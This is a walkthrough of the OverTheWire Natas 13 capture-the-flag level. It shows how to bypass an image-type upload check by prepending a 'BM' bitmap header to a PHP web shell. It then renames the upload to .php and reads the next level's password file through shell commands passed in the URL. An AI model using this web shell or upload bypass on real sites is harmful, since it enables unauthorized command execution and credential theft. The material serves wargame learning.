# 🔐 Natas 13 Walkthrough

This level is pretty simular, except we are given the information that **for security reasons, we now only accept image files!**
So naturally we need to inspect the [View sourcecode](http://natas13.natas.labs.overthewire.org/index-source.html) link.
The line that should get your attention:

```php
 else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
}
```
It should get your attention for two reasons. Firstly, the `echo` content, obviously pointing that its connected to checking the file type. Secondly, if you've heard of it `exif_imagetype`.

## What is exif?

We can read from the php documentation. ***exif_imagetype() reads the first bytes of an image and checks its signature.*** File types have different headers. Thats what this function does. It just checks the first bytes for file headers.
So, in order to get out `shell.php` file pass we need to give it an image header. Let's look at basic file type headers:

| Filetype | Header (ASCII) |
| -------- | -------------- |
| png      | ‰PNG           |
| jpg      | ÿØÿà           |
| bmp      | BM		    |

As we can see alot of the headers translated to ASCII are non-standard characters, this can be a problem so let's pick the one with normal chars - **bmp (bitmap).**

## Adding the header to the script

Let's take the script from our natas12 solution and add `BM` infront of it, so the `exif` function thinks the file is a **bitmap.**
```php
BM<?php echo shell_exec($_GET['e'] . ' 2>&1');?>
```

Now once we selected the file, we still need to change the file extension in the sourcecode of the website - as done previuosly in natas12. **Inspect** and navigate to:
```html
<input type="hidden" name="filename" value="<YOUR RANDOM STRING HERE>.jpg">
```

***Chagne it to:***

```html
<input type="hidden" name="filename" value="<YOUR RANDOM STRING HERE>.php">
```

Now let's upload the the file. If done correctly, the file should upload and the `this file is not an image` error shouldn't pop up. Next click the uploaded file and find this:
```
BM
Notice: Undefined index: e in /var/www/natas/natas13/upload/90ie57i74v.php on line 1
```

This is practically the same line as in natas12. Only the header is **BM**, as it should be.

## Navigate through the server contents

Like in natas12, we need to change the `e` variable as in our script. Let's change the url as before, firstly `?e=ls`:
```
http://natas13.natas.labs.overthewire.org/upload/90ie57i74v.php?e=ls
```

This should give us a list of all the files inside the server.

>[!CAUTION]
>As you can see at the start of the list there still is the **BM** header. Keep that in mind.

Now let's `?e=cat%20/etc/natas_webpass/natas14` to get the natas14 password:

```
http://natas13.natas.labs.overthewire.org/upload/90ie57i74v.php?e=cat%20/etc/natas_webpass/natas14
```

This will give us the password to natas14. ***HOWEVER...***
This printed line still contains the **BM** header, so in order to get the correct password, make sure to delete it :).
